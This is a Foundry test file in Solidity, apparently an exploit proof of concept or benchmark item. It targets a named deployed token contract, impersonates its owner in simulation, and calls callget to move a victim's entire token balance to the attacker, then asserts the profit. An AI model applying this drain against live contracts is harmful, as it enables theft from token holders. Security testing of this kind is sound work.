// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface MyBond {
    function owner() external view returns (address);
    function callget(address _from, address _to, uint256 _amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
    address attacker = address(this);
    address victim;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create a victim address with BOND tokens
        victim = address(0x123);
        vm.label(victim, "Victim");

        // Give victim some BOND tokens using deal()
        deal(address(TARGET), victim, 1000 * 1e18);

        // Get the current owner of the contract
        owner = MyBond(address(TARGET)).owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        // Record initial balances
        uint256 attackerInitialBalance = IERC20(address(TARGET)).balanceOf(attacker);
        uint256 victimBalance = IERC20(address(TARGET)).balanceOf(victim);

        console.log("Initial attacker balance:", attackerInitialBalance);
        console.log("Victim balance:", victimBalance);

        // Impersonate the owner to call callget()
        vm.prank(owner);
        MyBond(address(TARGET)).callget(victim, attacker, victimBalance);

        // Check final balances
        uint256 attackerFinalBalance = IERC20(address(TARGET)).balanceOf(attacker);
        console.log("Final attacker balance:", attackerFinalBalance);

        // Verify exploit succeeded
        assertGt(attackerFinalBalance, attackerInitialBalance, "Attacker balance should increase");
        assertEq(IERC20(address(TARGET)).balanceOf(victim), 0, "Victim should have 0 balance");
        uint256 finalBalance = IERC20(0xF347bDc0e502D33978b3c4d187bf75E5B452E491).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
